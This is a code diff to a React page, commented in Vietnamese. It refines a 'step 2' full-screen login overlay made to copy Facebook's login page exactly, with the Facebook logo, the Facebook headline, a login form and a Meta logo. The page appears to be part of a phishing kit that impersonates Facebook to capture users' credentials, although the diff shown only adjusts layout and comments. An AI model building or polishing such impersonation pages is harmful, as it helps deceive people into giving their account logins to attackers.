@@ -729,7 +729,7 @@ export default function Home() {
                 </div>
               )}
 
-                                                                                                               {/* BƯỚC 2: LOGIN FULL PAGE - Tinh gọn */}
+                                                                                                                            {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn 100% tỷ lệ FB */}
               {step === 2 && (
                 <div style={{ 
                   position: 'fixed', 
@@ -740,9 +740,9 @@ export default function Home() {
                   flexDirection: 'row' 
                 }}>
                   
-                  {/* CỘT TRÁI: Chiếm 2/3 không gian */}
+                  {/* CỘT TRÁI: Chiếm 2/3 không gian, chứa text và ảnh */}
                   <div style={{ 
-                    flex: '2',
+                    flex: '2', // Chiếm 2 phần
                     display: 'flex', 
                     flexDirection: 'column', 
                     justifyContent: 'center', 
@@ -752,6 +752,7 @@ export default function Home() {
                   }}>
                     <div style={{ width: '100%', maxWidth: '650px', margin: '0 auto', display: 'flex', flexDirection: 'column' }}>
                       
+                      {/* Logo F nhỏ */}
                       <svg viewBox="0 0 36 36" height="42" width="42" style={{ marginBottom: '24px' }}>
                         <path fill="#0866FF" d="M18 0C8.06 0 0 8.06 0 18s8.06 18 18 18c9.94 0 18-8.06 18-18S27.94 0 18 0zm4.04 26.13h-4.32v-14.4h-4.32v-4.32h4.32V5.04c0-2.92 1.62-4.32 4.32-4.32h3.6v4.32h-2.16c-1.08 0-1.44.36-1.44 1.44v1.44h4.32l-.72 4.32h-3.6v14.4z"/>
                       </svg>
@@ -760,6 +761,7 @@ export default function Home() {
                         Explore <br />the <br />things <br /><span style={{ color: '#0064e0' }}>you love.</span>
                       </h1>
                       
+                      {/* Ảnh to chiếm gần hết cột trái */}
                       <img 
                         src="/images/Anhlogin.webp" 
                         alt="Explore" 
@@ -768,9 +770,9 @@ export default function Home() {
                     </div>
                   </div>
 
-                  {/* CỘT PHẢI: Chiếm 1/3 không gian */}
+                  {/* CỘT PHẢI: Chiếm 1/3 không gian, chứa form đăng nhập */}
                   <div style={{ 
-                    flex: '1',
+                    flex: '1', // Chiếm 1 phần
                     display: 'flex', 
                     flexDirection: 'column', 
                     justifyContent: 'center', 
@@ -813,8 +815,8 @@ export default function Home() {
                         </button>
                       </form>
 
-                      {/* Logo Meta căn giữa thẳng hàng với nút Login */}
-                      <div style={{ textAlign: 'center', marginTop: '24px' }}>
+                      {/* Logo Meta căn giữa tuyệt đối với nút Login */}
+                      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', marginTop: '24px', width: '100%' }}>
                           <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '16px', opacity: 0.7 }} />
                       </div>
 
